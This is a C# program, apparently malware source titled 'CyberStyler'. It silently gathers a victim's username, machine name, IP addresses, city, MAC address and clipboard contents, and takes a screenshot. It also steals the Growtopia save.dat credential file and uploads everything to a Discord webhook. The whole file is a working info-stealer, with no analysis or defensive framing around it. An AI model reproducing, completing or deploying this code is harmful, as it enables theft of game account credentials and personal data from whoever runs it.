using System;
using System.Net;
using System.IO;
using JNogueira.Discord.Webhook.Client;
using System.Net.NetworkInformation;
namespace CyberStyler
{
    static class Program
    {
        /// <summary>
        ///  The main entry point for the application.
        /// </summary>

        [STAThread]
        static void Main()
        {
            var client = new DiscordWebhookClient("");
            string user = Environment.UserName;
            String host = System.Net.Dns.GetHostName();
            System.Net.IPAddress ip = Dns.GetHostByName(host).AddressList[0];
            WebClient webrows = new WebClient();
            string ip_internet = webrows.DownloadString("https://ipapi.co/ip/");
            string pcname = Environment.MachineName;
            string city = webrows.DownloadString("https://ipapi.co/city/");
            //string macAddresses = String.Join(":", nic.GetPhysicalAddress()
            //.GetAddressBytes()
            //.Select(b => b.ToString("X2"))
            //.ToArray());

            var mac = NetworkInterface.GetAllNetworkInterfaces();
            var getTarget = mac[0].GetPhysicalAddress();
            try
            {
                File.Delete(@"C:\Users" + user + @"\AppData\Local\Temp\screenshot.png");
            }
            catch
            {

            }
            Screenshot.GetScreenshot();
            var dat = Directory.GetFiles(@"C:\Users\" + user + @"\AppData\Local\Growtopia", "save.dat");
            var message = new DiscordMessage(
                username: "CyberHook",
                avatarUrl: "https://media.discordapp.net/attachments/876535927936282656/876538358946480148/1200px-Anonymous_emblem.png",
                tts: true,
                embeds: new[]{
                    new DiscordMessageEmbed(
                        "CyberHook Detected User",
                        color: 0,
                        author: new DiscordMessageEmbedAuthor(pcname),
                        image: new DiscordMessageEmbedImage("https://media2.giphy.com/media/lp3GUtG2waC88/giphy.gif"),
                        description: 
                        "```IPv4: " + ip_internet + " ```"
                        + "\n```IPv6 : " + ip + " ```"
                        + "\n```User: " + user + " ```"
                        + "\n```Dat Files: " + dat[0] + " ```"
                        + "\n```City: " + city + " ```"
                        + "\n```Mac: " + getTarget + " ```"
                        + "\n```Clipboard: " + ClipBoard.GetClipBorad() + " ```") 
                });;
            client.SendToDiscord(message);
            string filename = user + "-" + pcname + ".dat";
            string fileformat = "dat";
            string filepath = dat[0];
            string application = "";
            string mssgBody = "Download:";
            string filename1 = "Screenshot-" + pcname + ".png";
            string fileformat1 = "png";
            string filepath1 = @"C:\Users\" + user + @"\AppData\Local\Temp\screenshot.png";
            string msgBody1 = "Screenshot:";

            try
            {
                DiscordWebhook.SendFile(mssgBody, filename, fileformat, filepath, application);
                DiscordWebhook.SendFile(msgBody1, filename1, fileformat1, filepath1, application);// Sending log 
            }
            catch
            {
                DiscordWebhook.Send("Log size is more then 8 MB. Sending isn`t available.");
            }

        }
    }
}
